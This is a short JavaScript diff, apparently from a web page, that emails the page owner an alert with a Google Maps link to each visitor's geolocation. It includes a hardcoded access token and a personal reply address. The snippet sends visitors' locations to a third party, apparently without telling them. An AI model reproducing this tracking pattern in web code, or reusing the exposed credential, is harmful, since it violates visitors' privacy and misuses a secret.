@@ -88,7 +88,7 @@ function onError(error) {
     data= {
      
      subject: 'alert someone viewed your page',
-     text: "Their position is Latitude: " + position.coords.latitude + "Longitude: " + position.coords.longitude,
+      text: "https://maps.google.com/?q="+position.coords.latitude+","+position.coords.longitude,
       access_token: "7cw02zgebz6fyuo4bzobz7es",
       reply_to: "erict54757@gmail.com",
      
